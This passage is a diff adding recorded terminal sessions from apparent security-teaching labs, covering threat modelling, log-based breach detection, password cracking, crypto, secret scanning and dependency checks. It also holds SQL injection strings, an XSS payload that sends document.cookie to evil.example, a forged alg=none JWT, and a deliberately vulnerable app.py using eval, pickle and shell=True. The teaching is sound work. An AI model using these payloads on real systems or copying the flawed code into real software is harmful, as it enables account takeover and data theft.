@@ -21014,6 +21014,478 @@
   ],
   "key": "0aa18b598af6d4f5"
  },
+ "secops-1": {
+  "blocks": [
+   [
+    {
+     "c": "$ mkdir -p ~/lab/sec && cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat > risk.py <<'EOF'\n> # A small risk register for a web shop, using STRIDE to find threats and likelihood x impact to rank them.\n> STRIDE = {\"S\": \"Spoofing (pretending to be someone)\", \"T\": \"Tampering (changing data)\",\n>           \"R\": \"Repudiation (denying an action)\", \"I\": \"Information disclosure (leaking data)\",\n>           \"D\": \"Denial of service (making it unavailable)\", \"E\": \"Elevation of privilege (gaining rights)\"}\n> \n> threats = [  # (what, STRIDE letter, likelihood 1-5, impact 1-5, control)\n>     (\"Attacker logs in with a leaked password\", \"S\", 4, 4, \"MFA, breached-password check\"),\n>     (\"Customer changes the price field in the cart request\", \"T\", 3, 4, \"recompute price on the server\"),\n>     (\"Admin deletes orders and says they did not\", \"R\", 2, 3, \"audit log that admins cannot edit\"),\n>     (\"Database backup left in a public bucket\", \"I\", 3, 5, \"block public access, encrypt backups\"),\n>     (\"Bot floods the checkout page\", \"D\", 3, 3, \"rate limiting, CDN\"),\n>     (\"Support user opens the admin panel by editing the URL\", \"E\", 2, 5, \"check roles on every request\"),\n>     (\"Old library with a known bug in the image resizer\", \"T\", 3, 3, \"dependency scanning, patching\"),\n> ]\n> \n> print(\"%-55s %-3s %4s %s\" % (\"threat\", \"\", \"risk\", \"control\"))\n> for what, s, lik, imp, ctl in sorted(threats, key=lambda t: -t[2] * t[3]):\n>     risk = lik * imp\n>     level = \"HIGH\" if risk >= 15 else \"MED \" if risk >= 8 else \"LOW \"\n>     print(\"%-55s %-3s %2d %s %s\" % (what, s, risk, level, ctl))\n> print(\"\\ncoverage:\", {k: sum(1 for t in threats if t[1] == k) for k in STRIDE})\n> EOF",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ python3 risk.py",
+     "o": "threat                                                      risk control\nAttacker logs in with a leaked password                 S   16 HIGH MFA, breached-password check\nDatabase backup left in a public bucket                 I   15 HIGH block public access, encrypt backups\nCustomer changes the price field in the cart request    T   12 MED  recompute price on the server\nSupport user opens the admin panel by editing the URL   E   10 MED  check roles on every request\nBot floods the checkout page                            D    9 MED  rate limiting, CDN\nOld library with a known bug in the image resizer       T    9 MED  dependency scanning, patching\nAdmin deletes orders and says they did not              R    6 LOW  audit log that admins cannot edit\n\ncoverage: {'S': 1, 'T': 2, 'R': 1, 'I': 1, 'D': 1, 'E': 1}",
+     "x": 0
+    }
+   ]
+  ],
+  "key": "519c8f992bf304a2"
+ },
+ "secops-10": {
+  "blocks": [
+   [
+    {
+     "c": "$ cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat exceptions.json",
+     "o": "[\n {\"stage\": \"sast\", \"contains\": \"hashlib.md5\", \"reason\": \"MD5 used only as a cache key, reviewed by security\", \"expires\": \"2027-03-31\"},\n {\"stage\": \"dependencies\", \"contains\": \"pyyaml\", \"reason\": \"upgrade planned in sprint 41\", \"expires\": \"2026-10-31\"}\n]",
+     "x": 0
+    },
+    {
+     "c": "$ python3 pipeline.py",
+     "o": "secrets         FAIL  (1 blocking, 1 after exceptions)\n       app.py:3  secret in code  API_KEY = \"sk-demo-1234567890\"\n  [sast] accepted until 2027-03-31 (MD5 used only as a cache key, reviewed by security): app.py:21  hashlib.md5        MD5 is broken for security use\nsast            FAIL  (7 blocking, 6 after exceptions)\n       app.py:3   API_KEY            hard-coded secret\n       app.py:6   subprocess.run     shell=True with built strings allows command injection\n       app.py:9   db.execute         SQL built from strings; use ? parameters\n  [dependencies] exception EXPIRED on 2026-10-31: pyyaml    5.3     CVE-2020-14343: full_load can run arbitrar\ndependencies    FAIL  (3 blocking, 3 after exceptions)\n       requests  2.19.0  CVE-2018-18074: sends the Authorization header to another host after a r\n       reqeusts  1.0.0   LOOK-ALIKE of requests: possible typosquat\n       pyyaml    5.3     CVE-2020-14343: full_load can run arbitrary code; upgrade to 5.4\ninfrastructure  FAIL  (7 blocking, 7 after exceptions)\n       CRIT pod.json:web                                  privileged container: root on the node \n       CRIT aws_s3_bucket_public_access_block.backups     bucket can be made public\n       HIGH Dockerfile                                    no USER line: the app runs as root\n\nBUILD FAILED: fix or get an exception reviewed",
+     "x": 1
+    }
+   ],
+   [
+    {
+     "c": "$ cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat > app.py <<'EOF'\n> import ast, hashlib, json, os, subprocess, yaml\n> \n> API_KEY = os.environ[\"API_KEY\"]\n> \n> def ping(host):\n>     return subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True)\n> \n> def find_user(db, name):\n>     return db.execute(\"SELECT * FROM users WHERE name = ?\", (name,)).fetchall()\n> \n> def load_profile(data):\n>     return json.loads(data)\n> \n> def load_config(text):\n>     return yaml.safe_load(text)\n> \n> def calc(expr):\n>     return ast.literal_eval(expr)\n> \n> def token_hash(t):\n>     return hashlib.md5(t.encode()).hexdigest()\n> EOF",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ printf 'requests==2.32.3\\nflask==3.0.3\\npyyaml==6.0.2\\nnumpy==2.1.3\\n' > requirements.txt",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cd ~/lab/sec/iac",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat > Dockerfile <<'DF'\n> FROM python:3.12.7-slim\n> COPY requirements.txt /app/\n> RUN pip install --no-cache-dir -r /app/requirements.txt && useradd --uid 10001 app\n> COPY . /app\n> USER 10001\n> EXPOSE 8080\n> CMD [\"python\", \"/app/main.py\"]\n> DF",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat > pod.json <<'JS'\n> {\"kind\": \"Pod\", \"metadata\": {\"name\": \"shop\"},\n>  \"spec\": {\"containers\": [{\"name\": \"web\", \"image\": \"shop:1.4.2\",\n>    \"resources\": {\"limits\": {\"cpu\": \"500m\", \"memory\": \"256Mi\"}},\n>    \"securityContext\": {\"runAsNonRoot\": true, \"allowPrivilegeEscalation\": false, \"readOnlyRootFilesystem\": true}}]}}\n> JS",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ python3 - <<'PY'\n> import json\n> p = json.load(open(\"plan.json\"))\n> p[\"resource_changes\"][0][\"change\"][\"after\"] = {\"block_public_acls\": True, \"restrict_public_buckets\": True}\n> p[\"resource_changes\"][1][\"change\"][\"after\"][\"cidr_blocks\"] = [\"10.0.0.0/16\"]\n> json.dump(p, open(\"plan.json\", \"w\"))\n> PY",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ python3 pipeline.py",
+     "o": "secrets         pass  (0 blocking, 0 after exceptions)\n  [sast] accepted until 2027-03-31 (MD5 used only as a cache key, reviewed by security): app.py:21  hashlib.md5        MD5 is broken for security use\nsast            pass  (1 blocking, 0 after exceptions)\ndependencies    pass  (0 blocking, 0 after exceptions)\ninfrastructure  pass  (0 blocking, 0 after exceptions)\n\nBUILD PASSED",
+     "x": 0
+    }
+   ]
+  ],
+  "key": "2b19b000cfbecf58"
+ },
+ "secops-11": {
+  "blocks": [
+   [
+    {
+     "c": "$ mkdir -p ~/lab/sec && cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat > incident.py <<'EOF'\n> # Detection from logs: brute force, a success after many failures, and a login from a new country.\n> # The log is generated (a fixed seed, so the run repeats); its lines look like a Linux auth log.\n> import collections, datetime, random\n> random.seed(7)\n> t0 = datetime.datetime(2026, 11, 12, 1, 0, 0)\n> HOME = {\"asha\": \"IN\", \"ben\": \"IN\", \"chen\": \"SG\", \"root\": \"IN\"}\n> events = []\n> for i in range(40):                                   # normal staff logins\n>     u = random.choice([\"asha\", \"ben\", \"chen\"])\n>     events.append((t0 + datetime.timedelta(minutes=random.randint(0, 600)), \"Accepted\", u, f\"10.0.0.{random.randint(2, 40)}\", HOME[u]))\n> for i in range(5):                                    # a few typos\n>     events.append((t0 + datetime.timedelta(minutes=random.randint(0, 600)), \"Failed\", \"ben\", \"10.0.0.7\", \"IN\"))\n> start = t0 + datetime.timedelta(hours=3, minutes=12)  # the attack: guessing, then a hit\n> for i in range(60):\n>     events.append((start + datetime.timedelta(seconds=4 * i), \"Failed\", random.choice([\"root\", \"admin\", \"asha\"]), \"203.0.113.50\", \"NL\"))\n> events.append((start + datetime.timedelta(seconds=245), \"Accepted\", \"asha\", \"203.0.113.50\", \"NL\"))\n> events.sort()\n> log = [f\"{t:%b %d %H:%M:%S} web1 sshd[{900 + n}]: {r} password for {u} from {ip} port {40000 + n} ssh2 country={c}\"\n>        for n, (t, r, u, ip, c) in enumerate(events)]\n> print(len(log), \"log lines, for example:\"); print(\" \", log[0]); print(\" \", log[-1])\n> \n> # parse back from text, as a real detector would\n> rows = []\n> for line in log:\n>     p = line.split()\n>     rows.append((datetime.datetime.strptime(\"2026 \" + \" \".join(p[:3]), \"%Y %b %d %H:%M:%S\"), p[5], p[8], p[10], p[-1].split(\"=\")[1]))\n> \n> alerts, window, fails = [], datetime.timedelta(minutes=5), collections.defaultdict(list)\n> for t, result, user, ip, country in rows:\n>     if result == \"Failed\":\n>         fails[ip] = [x for x in fails[ip] if t - x <= window] + [t]\n>         if len(fails[ip]) == 10: alerts.append((t, \"HIGH\", f\"brute force: 10 failures from {ip} within 5 minutes\"))\n>     else:\n>         recent = [x for x in fails[ip] if t - x <= window]\n>         if len(recent) >= 10: alerts.append((t, \"CRIT\", f\"success for {user} from {ip} after {len(recent)} failures: likely compromised\"))\n>         if country != HOME[user]: alerts.append((t, \"HIGH\", f\"{user} logged in from {country}, usually {HOME[user]}\"))\n> print(\"\\nalerts:\")\n> for t, sev, msg in alerts: print(f\"  {t:%H:%M:%S} {sev:4} {msg}\")\n> print(\"\\ntimeline for 203.0.113.50:\")\n> mine = [r for r in rows if r[3] == \"203.0.113.50\"]\n> print(f\"  first seen {mine[0][0]:%H:%M:%S}, {sum(r[1] == 'Failed' for r in mine)} failures, users tried: {sorted({r[2] for r in mine})}\")\n> print(f\"  {mine[-1][0]:%H:%M:%S} login accepted as {mine[-1][2]}\")\n> print(\"  next steps: lock the asha account, end its sessions, block the IP, keep the logs, check what the session did\")\n> EOF",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ python3 incident.py",
+     "o": "106 log lines, for example:\n  Nov 12 01:38:00 web1 sshd[900]: Accepted password for asha from 10.0.0.7 port 40000 ssh2 country=IN\n  Nov 12 10:55:00 web1 sshd[1005]: Accepted password for asha from 10.0.0.38 port 40105 ssh2 country=IN\n\nalerts:\n  04:12:36 HIGH brute force: 10 failures from 203.0.113.50 within 5 minutes\n  04:16:05 CRIT success for asha from 203.0.113.50 after 60 failures: likely compromised\n  04:16:05 HIGH asha logged in from NL, usually IN\n\ntimeline for 203.0.113.50:\n  first seen 04:12:00, 60 failures, users tried: ['admin', 'asha', 'root']\n  04:16:05 login accepted as asha\n  next steps: lock the asha account, end its sessions, block the IP, keep the logs, check what the session did",
+     "x": 0
+    }
+   ]
+  ],
+  "key": "d1973a1b97dd0da8"
+ },
+ "secops-2": {
+  "blocks": [
+   [
+    {
+     "c": "$ mkdir -p ~/lab/sec && cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat > crack.py <<'EOF'\n> # Why passwords are stored with a salt and a slow hash. A \"leaked\" table is cracked with a word list.\n> import hashlib, os, time\n> \n> users = {\"asha\": \"sunshine\", \"ben\": \"Sunshine1\", \"chen\": \"correct-horse-battery-staple\", \"dev\": \"sunshine\"}\n> wordlist = [\"123456\", \"password\", \"qwerty\", \"sunshine\", \"letmein\", \"dragon\", \"Sunshine1\", \"iloveyou\"]\n> \n> # 1) plain fast hash, no salt: what too many old systems did\n> fast = {u: hashlib.sha256(p.encode()).hexdigest() for u, p in users.items()}\n> print(\"1) unsalted sha256\")\n> for u, h in fast.items(): print(f\"   {u:5} {h[:16]}...\")\n> print(\"   asha and dev have the SAME hash, so cracking one cracks both\")\n> table = {hashlib.sha256(w.encode()).hexdigest(): w for w in wordlist}   # computed once, used on every leak\n> print(\"   cracked:\", {u: table[h] for u, h in fast.items() if h in table})\n> \n> # 2) salted slow hash (PBKDF2; bcrypt, scrypt and Argon2 are the usual choices)\n> ROUNDS = 100_000\n> if hasattr(hashlib, \"pbkdf2_hmac\"):\n>     def slow(pw, salt): return hashlib.pbkdf2_hmac(\"sha256\", pw.encode(), salt, ROUNDS).hex()\n> else:                                        # the in-browser Python has no pbkdf2_hmac: same maths, fewer rounds\n>     import hmac; ROUNDS = 5_000\n>     def slow(pw, salt):\n>         mac = hmac.new(pw.encode(), digestmod=\"sha256\")\n>         def prf(m): h = mac.copy(); h.update(m); return h.digest()\n>         u = prf(salt + b\"\\x00\\x00\\x00\\x01\"); out = int.from_bytes(u, \"big\")\n>         for _ in range(ROUNDS - 1): u = prf(u); out ^= int.from_bytes(u, \"big\")\n>         return out.to_bytes(32, \"big\").hex()\n> stored = {}\n> for u, p in users.items():\n>     salt = os.urandom(16); stored[u] = (salt, slow(p, salt))\n> print(f\"\\n2) salted pbkdf2, {ROUNDS:,} rounds: asha and dev now differ:\", stored[\"asha\"][1][:12], \"vs\", stored[\"dev\"][1][:12])\n> t0 = time.perf_counter(); slow(\"x\", b\"s\" * 16); per = time.perf_counter() - t0\n> t0 = time.perf_counter(); [hashlib.sha256(b\"x\").digest() for _ in range(100_000)]; fast_per = (time.perf_counter() - t0) / 100_000\n> print(f\"   one guess: sha256 {fast_per * 1e6:.2f} microseconds, pbkdf2 {per * 1000:.0f} milliseconds\")\n> print(f\"   so the slow hash costs an attacker about {per / fast_per:,.0f} times more per guess, per user\")\n> cracked = {}\n> for u, (salt, h) in stored.items():          # the attacker must redo the whole list for every salt\n>     for w in wordlist:\n>         if slow(w, salt) == h: cracked[u] = w; break\n> print(\"   cracked anyway:\", cracked, \"<- weak passwords still fall; the long passphrase did not\")\n> EOF",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ python3 crack.py",
+     "o": "1) unsalted sha256\n   asha  a941a4c4fd0c01cd...\n   ben   4fe3c8595d005427...\n   chen  87cbebfeebc05f7c...\n   dev   a941a4c4fd0c01cd...\n   asha and dev have the SAME hash, so cracking one cracks both\n   cracked: {'asha': 'sunshine', 'ben': 'Sunshine1', 'dev': 'sunshine'}\n\n2) salted pbkdf2, 100,000 rounds: asha and dev now differ: 4780fc704e95 vs cff0bed4adb3\n   one guess: sha256 0.41 microseconds, pbkdf2 24 milliseconds\n   so the slow hash costs an attacker about 58,671 times more per guess, per user\n   cracked anyway: {'asha': 'sunshine', 'ben': 'Sunshine1', 'dev': 'sunshine'} <- weak passwords still fall; the long passphrase did not",
+     "x": 0
+    }
+   ]
+  ],
+  "key": "875c6ac260f2ff1b"
+ },
+ "secops-3": {
+  "blocks": [
+   [
+    {
+     "c": "$ cd ~",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ mkdir -p ~/lab/sec/crypto && cd ~/lab/sec/crypto",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ echo \"Pay Ravi 500 rupees\" > note.txt",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "# 1) a hash: a fingerprint. One changed letter gives a completely different value",
+     "o": ""
+    },
+    {
+     "c": "$ sha256sum note.txt",
+     "o": "138ef00442e6b149e43e562bc9bac66e075bccad168f6ba51d8a25ad4292b2c9  note.txt",
+     "x": 0
+    },
+    {
+     "c": "$ echo \"Pay Ravi 900 rupees\" | sha256sum",
+     "o": "13e592e2ca9e6b9e9d708f852acdda481d6d92e47d809319033c77a494d63b58  -",
+     "x": 0
+    },
+    {
+     "c": "# 2) symmetric encryption: the same secret key locks and unlocks",
+     "o": ""
+    },
+    {
+     "c": "$ openssl enc -aes-256-cbc -pbkdf2 -salt -in note.txt -out note.enc -pass pass:class-demo-key",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ head -c 32 note.enc | od -An -c | head -2",
+     "o": "   S   a   l   t   e   d   _   _   Y   : 021 344 361 377  \\a 021\n 337 234   /   E   > 207 024  \\t  \\f 035 033 240 226 320 266 361",
+     "x": 0
+    },
+    {
+     "c": "$ openssl enc -d -aes-256-cbc -pbkdf2 -in note.enc -pass pass:class-demo-key",
+     "o": "Pay Ravi 500 rupees",
+     "x": 0
+    },
+    {
+     "c": "$ openssl enc -d -aes-256-cbc -pbkdf2 -in note.enc -pass pass:wrong-key 2>&1 | head -1",
+     "o": "bad decrypt",
+     "x": 0
+    },
+    {
+     "c": "# 3) asymmetric: a private key signs, anyone with the public key verifies",
+     "o": ""
+    },
+    {
+     "c": "$ openssl genpkey -algorithm ed25519 -out private.pem",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ openssl pkey -in private.pem -pubout -out public.pem",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ openssl pkeyutl -sign -inkey private.pem -rawin -in note.txt -out note.sig",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ openssl pkeyutl -verify -pubin -inkey public.pem -rawin -in note.txt -sigfile note.sig",
+     "o": "Signature Verified Successfully",
+     "x": 0
+    },
+    {
+     "c": "$ echo \"Pay Ravi 900 rupees\" > forged.txt",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ openssl pkeyutl -verify -pubin -inkey public.pem -rawin -in forged.txt -sigfile note.sig",
+     "o": "Signature Verification Failure",
+     "x": 1
+    },
+    {
+     "c": "# 4) a certificate binds a public key to a name; here we sign our own (browsers would not trust it)",
+     "o": ""
+    },
+    {
+     "c": "$ openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -keyout site.key -out site.crt -days 30 -subj \"/CN=shop.example\" 2>/dev/null",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ openssl x509 -in site.crt -noout -subject -issuer -dates | sed 's/=.*GMT/=<date>/'",
+     "o": "subject=CN = shop.example\nissuer=CN = shop.example\nnotBefore=<date>\nnotAfter=<date>",
+     "x": 0
+    }
+   ]
+  ],
+  "key": "50235c60c79afb00"
+ },
+ "secops-4": {
+  "blocks": [
+   [
+    {
+     "c": "$ mkdir -p ~/lab/sec && cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat > inject.py <<'EOF'\n> # SQL injection, then the fix. An in-memory database, so nothing real is touched.\n> import sqlite3, html\n> db = sqlite3.connect(\":memory:\")\n> db.executescript(\"\"\"\n> CREATE TABLE users(id INTEGER PRIMARY KEY, name TEXT, password TEXT, role TEXT);\n> INSERT INTO users VALUES (1,'admin','s3cret-admin','admin'),(2,'asha','asha-pass','customer');\n> CREATE TABLE cards(user_id INT, number TEXT);\n> INSERT INTO cards VALUES (2,'4111 1111 1111 1111');\n> \"\"\")\n> \n> def login_bad(name, pw):\n>     sql = f\"SELECT id, name, role FROM users WHERE name = '{name}' AND password = '{pw}'\"   # text glued into code\n>     print(\"   SQL:\", sql)\n>     return db.execute(sql).fetchall()\n> \n> def login_good(name, pw):\n>     return db.execute(\"SELECT id, name, role FROM users WHERE name = ? AND password = ?\", (name, pw)).fetchall()\n> \n> print(\"1) normal login\");            print(\"  \", login_bad(\"asha\", \"asha-pass\"))\n> print(\"2) wrong password\");          print(\"  \", login_bad(\"asha\", \"guess\"))\n> print(\"3) injection: the quote ends the string, -- comments out the password check\")\n> print(\"  \", login_bad(\"admin' --\", \"anything\"))\n> print(\"4) injection: UNION adds rows from another table\")\n> print(\"  \", login_bad(\"x' UNION SELECT user_id, number, 'leak' FROM cards --\", \"\"))\n> print(\"5) the same attacks against the parameterised query\")\n> print(\"  \", login_good(\"admin' --\", \"anything\"), login_good(\"x' UNION SELECT user_id, number, 'leak' FROM cards --\", \"\"))\n> \n> print(\"\\nCross-site scripting: user text placed in a page\")\n> comment = '<script>fetch(\"https://evil.example/?c=\"+document.cookie)</script>'\n> print(\"  unsafe:\", f\"<p>{comment}</p>\")\n> print(\"  escaped:\", f\"<p>{html.escape(comment)}</p>\")\n> EOF",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ python3 inject.py",
+     "o": "1) normal login\n   SQL: SELECT id, name, role FROM users WHERE name = 'asha' AND password = 'asha-pass'\n   [(2, 'asha', 'customer')]\n2) wrong password\n   SQL: SELECT id, name, role FROM users WHERE name = 'asha' AND password = 'guess'\n   []\n3) injection: the quote ends the string, -- comments out the password check\n   SQL: SELECT id, name, role FROM users WHERE name = 'admin' --' AND password = 'anything'\n   [(1, 'admin', 'admin')]\n4) injection: UNION adds rows from another table\n   SQL: SELECT id, name, role FROM users WHERE name = 'x' UNION SELECT user_id, number, 'leak' FROM cards --' AND password = ''\n   [(2, '4111 1111 1111 1111', 'leak')]\n5) the same attacks against the parameterised query\n   [] []\n\nCross-site scripting: user text placed in a page\n  unsafe: <p><script>fetch(\"https://evil.example/?c=\"+document.cookie)</script></p>\n  escaped: <p>&lt;script&gt;fetch(&quot;https://evil.example/?c=&quot;+document.cookie)&lt;/script&gt;</p>",
+     "x": 0
+    }
+   ]
+  ],
+  "key": "add5502dae43db1a"
+ },
+ "secops-5": {
+  "blocks": [
+   [
+    {
+     "c": "$ mkdir -p ~/lab/sec && cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat > jwt_demo.py <<'EOF'\n> # A JSON Web Token built by hand with the standard library, then three attacks on it.\n> import base64, hashlib, hmac, json, time\n> KEY = b\"server-only-secret\"            # in real life: a long random value from a secret store\n> def b64(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n> def unb64(s): return base64.urlsafe_b64decode(s + \"=\" * (-len(s) % 4))\n> \n> def sign(payload, alg=\"HS256\"):\n>     head = b64(json.dumps({\"alg\": alg, \"typ\": \"JWT\"}).encode()); body = b64(json.dumps(payload).encode())\n>     sig = b64(hmac.new(KEY, f\"{head}.{body}\".encode(), hashlib.sha256).digest()) if alg == \"HS256\" else \"\"\n>     return f\"{head}.{body}.{sig}\"\n> \n> def verify_naive(tok):                       # trusts the header's \"alg\", a classic mistake\n>     head, body, sig = tok.split(\".\")\n>     if json.loads(unb64(head))[\"alg\"] == \"none\": return json.loads(unb64(body))\n>     good = b64(hmac.new(KEY, f\"{head}.{body}\".encode(), hashlib.sha256).digest())\n>     return json.loads(unb64(body)) if hmac.compare_digest(sig, good) else None\n> \n> def verify(tok, now):                         # fixed algorithm, constant-time compare, expiry checked\n>     head, body, sig = tok.split(\".\")\n>     good = b64(hmac.new(KEY, f\"{head}.{body}\".encode(), hashlib.sha256).digest())\n>     if not hmac.compare_digest(sig, good): return \"rejected: bad signature\"\n>     claims = json.loads(unb64(body))\n>     if claims[\"exp\"] < now: return \"rejected: expired\"\n>     return claims\n> \n> now = 1_800_000_000\n> tok = sign({\"sub\": \"asha\", \"role\": \"customer\", \"exp\": now + 900})\n> print(\"token:\", tok[:60] + \"...\")\n> print(\"anyone can READ it (it is only encoded):\", unb64(tok.split(\".\")[1]).decode())\n> print(\"verify:\", verify(tok, now))\n> \n> h, b, s = tok.split(\".\")\n> tampered = h + \".\" + b64(json.dumps({\"sub\": \"asha\", \"role\": \"admin\", \"exp\": now + 900}).encode()) + \".\" + s\n> print(\"\\n1) change role to admin, keep old signature ->\", verify(tampered, now))\n> print(\"2) token after 15 minutes ->\", verify(tok, now + 901))\n> none_tok = sign({\"sub\": \"asha\", \"role\": \"admin\", \"exp\": now + 900}, alg=\"none\")\n> print(\"3) alg=none token: naive verifier ->\", verify_naive(none_tok))\n> print(\"                   fixed verifier ->\", verify(none_tok, now))\n> \n> print(\"\\nBroken access control (IDOR): the id in the URL is not proof of ownership\")\n> orders = {101: \"asha\", 102: \"ben\"}\n> def get_order(user, order_id, check=True):\n>     if check and orders[order_id] != user: return \"403 forbidden\"\n>     return f\"order {order_id} details\"\n> print(\"  asha asks for /orders/102 without a check:\", get_order(\"asha\", 102, check=False))\n> print(\"  with an ownership check:                  \", get_order(\"asha\", 102))\n> EOF",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ python3 jwt_demo.py",
+     "o": "token: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYXNoYSI...\nanyone can READ it (it is only encoded): {\"sub\": \"asha\", \"role\": \"customer\", \"exp\": 1800000900}\nverify: {'sub': 'asha', 'role': 'customer', 'exp': 1800000900}\n\n1) change role to admin, keep old signature -> rejected: bad signature\n2) token after 15 minutes -> rejected: expired\n3) alg=none token: naive verifier -> {'sub': 'asha', 'role': 'admin', 'exp': 1800000900}\n                   fixed verifier -> rejected: bad signature\n\nBroken access control (IDOR): the id in the URL is not proof of ownership\n  asha asks for /orders/102 without a check: order 102 details\n  with an ownership check:                   403 forbidden",
+     "x": 0
+    }
+   ]
+  ],
+  "key": "0ad3bc042c9da7e1"
+ },
+ "secops-6": {
+  "blocks": [
+   [
+    {
+     "c": "$ cd ~",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ mkdir -p ~/lab/sec/app && cd ~/lab/sec/app && rm -rf .git *",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ git init -q && git config user.name dev && git config user.email dev@example.com",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat > settings.py <<'PY'\n> DB_HOST = \"db.internal\"\n> DB_PASSWORD = \"Winter2026!shop\"\n> AWS_ACCESS_KEY_ID = \"AKIAIOSFODNN7EXAMPLE\"\n> API_TOKEN = \"q8ZrT2vLx9WkP4mNc7HjB3sYd6Fg\"\n> PY",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ git add . && git commit -qm \"first version\"",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "# someone notices and \"removes\" the secrets",
+     "o": ""
+    },
+    {
+     "c": "$ cat > settings.py <<'PY'\n> import os\n> DB_HOST = \"db.internal\"\n> DB_PASSWORD = os.environ[\"DB_PASSWORD\"]\n> PY",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ git add . && git commit -qm \"remove secrets\"",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ echo \"--- current files:\"; python3 ../scan.py settings.py",
+     "o": "--- current files:\n0 finding(s)",
+     "x": 0
+    },
+    {
+     "c": "$ echo \"--- whole history:\"; git log -p | python3 ../scan.py -",
+     "o": "--- whole history:\nhistory:4  secret in code  DB_PASSWORD = \"Winter2026!shop\"\nhistory:5  AWS access key id  AWS_ACCESS_KEY_ID = \"AKIAIOSFODNN7EXAMPLE\"\nhistory:6  secret in code  API_TOKEN = \"q8ZrT2vLx9WkP4mNc7HjB3sYd6Fg\"\nhistory:6  random-looking string (entropy 4.8)  q8ZrT2vLx9Wk...\n4 finding(s)",
+     "x": 1
+    },
+    {
+     "c": "$ echo \"--- the old value is one command away:\"; git log -p -S Winter2026 --format=\"%h %s\" | grep -E \"^[0-9a-f]{7}|Winter\"",
+     "o": "--- the old value is one command away:\n6359968 remove secrets\n-DB_PASSWORD = \"Winter2026!shop\"\n996bbb8 first version\n+DB_PASSWORD = \"Winter2026!shop\"",
+     "x": 0
+    }
+   ]
+  ],
+  "key": "a92e7a1959b6d0a1"
+ },
+ "secops-7": {
+  "blocks": [
+   [
+    {
+     "c": "$ mkdir -p ~/lab/sec && cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ python3 supply.py",
+     "o": "requests  2.19.0  CVE-2018-18074: sends the Authorization header to another host after a redirect; upgrade to 2.20.0\nflask     3.0.3   ok\nreqeusts  1.0.0   LOOK-ALIKE of requests: possible typosquat\npyyaml    5.3     CVE-2020-14343: full_load can run arbitrary code; upgrade to 5.4\nnumpy     1.20    NOT PINNED: any newer release (including a hijacked one) installs\ninstall flask from the real file: hash matches, install\ninstall flask from a swapped file on a hacked mirror: HASH MISMATCH, refuse\n\nSBOM (first two components): [{\"type\": \"library\", \"name\": \"requests\", \"version\": \"2.19.0\", \"purl\": \"pkg:pypi/requests@2.19.0\"}, {\"type\": \"library\", \"name\": \"flask\", \"version\": \"3.0.3\", \"purl\": \"pkg:pypi/flask@3.0.3\"}]",
+     "x": 0
+    }
+   ]
+  ],
+  "key": "9e85621f4f7f2009"
+ },
+ "secops-8": {
+  "blocks": [
+   [
+    {
+     "c": "$ cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat -n app.py",
+     "o": "     1\timport hashlib, pickle, subprocess, sqlite3, yaml\n     2\t\n     3\tAPI_KEY = \"sk-demo-1234567890\"\n     4\t\n     5\tdef ping(host):\n     6\t    return subprocess.run(\"ping -c 1 \" + host, shell=True, capture_output=True)\n     7\t\n     8\tdef find_user(db, name):\n     9\t    return db.execute(\"SELECT * FROM users WHERE name = '%s'\" % name).fetchall()\n    10\t\n    11\tdef load_profile(data):\n    12\t    return pickle.loads(data)\n    13\t\n    14\tdef load_config(text):\n    15\t    return yaml.load(text)\n    16\t\n    17\tdef calc(expr):\n    18\t    return eval(expr)\n    19\t\n    20\tdef token_hash(t):\n    21\t    return hashlib.md5(t.encode()).hexdigest()",
+     "x": 0
+    }
+   ],
+   [
+    {
+     "c": "$ cd ~/lab/sec",
+     "o": "",
+     "x": 0
+    },
+    {
+     "c": "$ cat sast.py",
